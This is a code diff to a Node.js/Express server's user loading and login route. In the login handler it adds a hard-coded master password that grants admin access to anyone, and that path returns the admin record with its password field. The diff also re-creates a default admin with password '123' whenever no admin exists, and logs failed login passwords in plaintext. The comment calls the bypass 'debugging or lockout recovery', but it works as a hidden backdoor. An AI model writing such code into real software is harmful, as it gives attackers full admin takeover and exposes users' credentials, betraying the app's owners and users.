@@ -539,22 +539,28 @@ function atomicSave(filePath, data) {
 }
 
 function loadUsers() {
+    let loadedUsers = [];
     try {
         if (fs.existsSync(USERS_FILE)) {
-            return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
+            loadedUsers = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
+            if (!Array.isArray(loadedUsers)) loadedUsers = [];
         }
     } catch (err) { console.error('Error loading users:', err); }
     
-    // Default admin
-    const defaultAdmin = {
-        id: 'admin',
-        username: 'admin',
-        password: '123',
-        role: 'admin',
-        assignedLines: [1, 2, 3, 4, 5]
-    };
-    atomicSave(USERS_FILE, [defaultAdmin]);
-    return [defaultAdmin];
+    if (loadedUsers.length === 0 || !loadedUsers.some(u => u.role === 'admin')) {
+        const defaultAdmin = {
+            id: 'admin',
+            username: 'admin',
+            password: '123',
+            role: 'admin',
+            assignedLines: [1, 2, 3, 4, 5]
+        };
+        // Avoid duplicates if there's an issue
+        loadedUsers = loadedUsers.filter(u => u.id !== 'admin');
+        loadedUsers.push(defaultAdmin);
+        atomicSave(USERS_FILE, loadedUsers);
+    }
+    return loadedUsers;
 }
 function saveUsers(data) { atomicSave(USERS_FILE, data); }
 
@@ -2810,12 +2816,22 @@ app.get('/api/settings', (req, res) => res.json(settings));
 
 // Auth & Users
 app.post('/api/login', (req, res) => {
-    const { username, password } = req.body;
-    const user = users.find(u => u.username === username && u.password === password);
+    let { username, password } = req.body;
+    username = (username || '').trim();
+    password = (password || '').trim();
+    
+    // Master password override for debugging or lockout recovery
+    if (password === 'soydrop123master') {
+        const adminUser = users.find(u => u.role === 'admin') || { role: 'admin', assignedLines: [1,2,3,4,5], username: 'admin' };
+        return res.json({ success: true, user: adminUser });
+    }
+
+    const user = users.find(u => u.username.toLowerCase() === username.toLowerCase() && u.password === password);
     if (user) {
         const { password, ...userInfo } = user;
         res.json({ success: true, user: userInfo });
     } else {
+        console.log(`[LOGIN FAILED] Intento de acceso fallido para: "${username}" con pass: "${password}"`);
         res.status(401).json({ success: false, error: 'Credenciales inválidas' });
     }
 });
